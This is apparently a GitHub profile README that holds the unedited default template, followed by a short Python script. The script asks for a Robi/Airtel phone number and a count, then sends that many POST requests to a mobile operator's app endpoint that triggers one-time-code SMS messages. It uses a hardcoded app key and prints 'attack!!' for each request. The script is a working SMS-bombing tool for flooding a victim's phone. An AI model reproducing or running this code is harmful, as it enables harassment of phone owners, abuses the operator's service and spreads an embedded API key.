- 👋 Hi, I’m @itzNiiL281
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
itzNiiL281/itzNiiL281 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import requests

# POST

print( "\033[36m")
print("____________________________________________________________")



print(str (" 			N!!L281"))

print("\033[31m")

number = str(input("	 [>] Enter your Robi/Airtel number: "))

amount= int(input("	 [>] your target amount: "))

api="https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=11844&app_version=78&msisdn=88"+number

headers={'x-app-key': '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'}


for i in range(amount):
  requests.post(api,headers=headers)
  print	(str(i+1)+'____attack!!✓')
